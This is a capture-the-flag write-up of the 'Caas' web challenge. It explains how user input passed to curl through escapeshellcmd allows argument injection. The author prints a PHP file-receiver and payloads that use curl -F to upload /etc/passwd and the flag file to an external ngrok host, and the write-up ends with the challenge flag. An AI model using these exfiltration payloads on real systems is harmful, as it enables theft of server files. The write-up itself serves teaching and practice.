# Caas

> *cURL As A Service or CAAS is a brand new Alien application, built so that humans can test the status of their websites. However, it seems that the Aliens have not quite got the hang of Human programming and the application is riddled with issues.*
> *This challenge will raise 43 euros for a good cause.*

The website simply `curl` a given domain name or IP address and return the result to the client user

![image-20210421004632439](https://github.com/Ch3lLIST4/CTF-Writeups-2021/blob/main/Cyber-Apocalypse-2021/images/Caas-1.png?raw=true)

Taking a look at the source code given, these are the 3 main files that we need to pay close attention for

`main.js` for front-end processing :

```js
var input = document.getElementById('command');
var output = document.getElementById("console-output");

document.getElementById("command").addEventListener('keydown', (e) => {
  if (e.keyCode === 13) {

    let host = input.value;

    try {
      new URL(host);
    } catch {
      return output.innerHTML = "Illegal Characters Detected";
    }

    output.innerHTML = '';

    fetch('/api/curl', {
      method: 'POST',
      body: `ip=${host}`,
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
      }
    })
    .then(resp => resp.json())
    .then(data => {
      output.innerHTML = data.message;
    });

    input.value = '';
  }
});
```

`index.php` :

```php
<?php 
date_default_timezone_set('UTC');

spl_autoload_register(function ($name){
    if (preg_match('/Controller$/', $name))
    {
        $name = "controllers/${name}";
    }
    else if (preg_match('/Model$/', $name))
    {
        $name = "models/${name}";
    }
    include_once "${name}.php";
});

$router = new Router();
$router->new('GET', '/', 'CurlController@index');
$router->new('POST', '/api/curl', 'CurlController@execute' );

$response = $router->match();

die($response);
```

`CommandModel.php` :

```php
<?php
class CommandModel
{
    public function __construct($url)
    {
        $this->command = "curl -sL " . escapeshellcmd($url);
    }

    public function exec()
    {
        exec($this->command, $output);
        return $output;
    }
}
```

Basically the application will take a user input as a `host` URL to use as a `curl` command argument in `CommandModel.php` to respond the host's content to the client. As they used `escapeshellcmd()` to ensure that user execute only *one command*, we can exploit this using **Argument Injection** technique

Firstly, I built up a shell to retrieve the exfiltrated file data from the vulnerable server

```php
<?php file_put_contents('passwords.txt', file_get_contents($_FILES['password']['tmp_name'])); ?>
```

Then I hosted it using **ngrok** secure tunnel

![image-20210420231516732](https://github.com/Ch3lLIST4/CTF-Writeups-2021/blob/main/Cyber-Apocalypse-2021/images/Caas-2.png?raw=true)

To bypass the `trycatch` used in the front-end JavaScript file, I simply used BurpSuite to intercept and modify the request

I used this payload to test the file retrieval on `/etc/passwd` and it workded

```
-F password=@/etc/passwd http://521cc97681d2.ngrok.io/shell.php
```

![image-20210420231924112](https://github.com/Ch3lLIST4/CTF-Writeups-2021/blob/main/Cyber-Apocalypse-2021/images/Caas-3.png?raw=true)

Now I tried to retrieve the flag at `../../flag` :

```
-F password=@../../flag http://521cc97681d2.ngrok.io/shell.php
```

![image-20210420232202459](https://github.com/Ch3lLIST4/CTF-Writeups-2021/blob/main/Cyber-Apocalypse-2021/images/Caas-4.png?raw=true)

Flag :

```
CHTB{f1le_r3trieval_4s_a_s3rv1ce}
```

